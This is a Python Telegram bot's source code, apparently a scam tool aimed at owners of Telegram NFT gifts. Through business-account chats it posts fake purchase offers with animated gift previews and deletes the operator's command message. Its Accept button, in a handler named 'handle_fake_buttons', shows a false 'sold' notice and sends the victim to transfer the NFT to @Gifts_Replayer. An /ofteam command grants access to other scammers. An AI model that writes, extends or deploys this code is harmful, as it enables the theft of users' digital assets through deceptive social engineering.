import asyncio
import os
import re
import subprocess
import tempfile
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, LinkPreviewOptions
from aiogram.exceptions import TelegramBadRequest
from rlottie_python import LottieAnimation

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_users = set()
ADMIN_ID = None 

MESSAGES = {
    "ru": {
        "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд.",
        "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "btn_transfer": "Передать NFT"
    },
    "en": {
        "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> to receive stars.",
        "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "btn_transfer": "Transfer NFT"
    },
    "ua": {
        "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зарахування зірок.",
        "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
        "btn_accept": "Прийняти",
        "btn_decline": "Відхилити",
        "btn_transfer": "Передати NFT"
    },
    "ar": {
        "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> لاستلام النجوم.",
        "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
        "btn_accept": "قبول",
        "btn_decline": "رفض",
        "btn_transfer": "نقل NFT"
    }
}

def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

def convert_lottie_to_mp4(lottie_bytes: bytes, output_path: str):
    anim = LottieAnimation.from_data(data=lottie_bytes.decode('utf-8'))
    total_frames = anim.lottie_animation_get_totalframe()
    framerate = anim.lottie_animation_get_framerate()
    if framerate <= 0: framerate = 30

    with tempfile.TemporaryDirectory() as tmpdir:
        for i in range(total_frames):
            png_path = os.path.join(tmpdir, f"frame_{i:04d}.png")
            anim.save_frame(png_path, frame_num=i)
        
        subprocess.run([
            "ffmpeg", "-y", "-framerate", str(framerate),
            "-i", os.path.join(tmpdir, "frame_%04d.png"),
            "-c:v", "libx264", "-pix_fmt", "yuv420p",
            "-vf", "pad=ceil(iw/2)*2:ceil(ih/2)*2",
            output_path
        ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    global ADMIN_ID
    ADMIN_ID = message.from_user.id 
    text = (
        "<b>Как начать:</b>\n"
        "Отправь /ofteam — и доступ будет выдан.\n\n"
        "<b>Формат оффера:</b>\n"
        "<code>/of ССЫЛКА ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
        "Валюты: stars / gram\n"
        "Языки: ru / en / ua / ar"
    )
    await message.answer(text, parse_mode="HTML")

@dp.message(Command("ofteam"))
async def cmd_ofteam(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_users:
        await message.answer("✅ Доступ уже активен. Можно отправлять оферы.")
    else:
        active_users.add(user_id)
        await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")

@dp.message(F.text.startswith("/of"))
async def block_offer_in_pm(message: types.Message):
    await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")

@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    business_connection_id = message.business_connection_id
    if not business_connection_id: return

    parts = message.text.split()
    if len(parts) < 4: return

    link = parts[1]
    if not link.startswith("http"): link = "https://" + link
    try:
        amount = int(parts[2])
    except ValueError:
        return
    
    currency = parts[3].lower()
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    lang = parts[4].lower() if len(parts) > 4 else "ru"
    if lang not in MESSAGES: lang = "ru"

    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match: return
    
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    msg_data = MESSAGES[lang]

    caption_text = msg_data["offer"].format(username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)

    try:
        await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])

        lottie_url = f"https://nft.fragment.com/gift/{gift_slug}.lottie.json"
        async with aiohttp.ClientSession() as session:
            async with session.get(lottie_url) as resp:
                if resp.status != 200: raise Exception("Нет анимации")
                lottie_bytes = await resp.read()

        mp4_path = f"/tmp/{gift_slug}.mp4"
        convert_lottie_to_mp4(lottie_bytes, mp4_path)

        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
        ]])

        video_file = FSInputFile(mp4_path)
        await bot.send_animation(
            chat_id=message.chat.id,
            animation=video_file,
            caption=caption_text,
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML"
        )
        os.remove(mp4_path)

    except Exception as e:
        if ADMIN_ID:
            try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка:</b>\n<code>{e}</code>", parse_mode="HTML")
            except: pass
        print(f"Ошибка: {e}")

@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    if not callback.message: return
    data_parts = callback.data.split(":")
    action, gift_slug, amount, currency, lang = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4]
    
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    link = f"https://t.me/nft/{gift_slug}"
    pretty_name = get_pretty_name(gift_slug)
    business_connection_id = callback.message.business_connection_id
    msg_data = MESSAGES.get(lang, MESSAGES["ru"])

    try:
        if business_connection_id:
            await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
        else:
            await callback.message.delete()

        if action == "accept":
            # ВОЗВРАЩАЕМ СТАРЫЙ ТЕКСТ
            new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
            
            # ВОЗВРАЩАЕМ ОДНУ КНОПКУ "ПЕРЕДАТЬ NFT"
            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
            ])
        else:
            new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
            new_keyboard = None

        kwargs = {
            "chat_id": callback.message.chat.id, 
            "text": new_text, 
            "reply_markup": new_keyboard, 
            "parse_mode": "HTML",
            "link_preview_options": LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
        }
        
        if business_connection_id: kwargs["business_connection_id"] = business_connection_id
        await bot.send_message(**kwargs)
        await callback.answer()
    except Exception as e:
        print(f"Ошибка кнопки: {e}")
        await callback.answer("Ошибка", show_alert=True)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
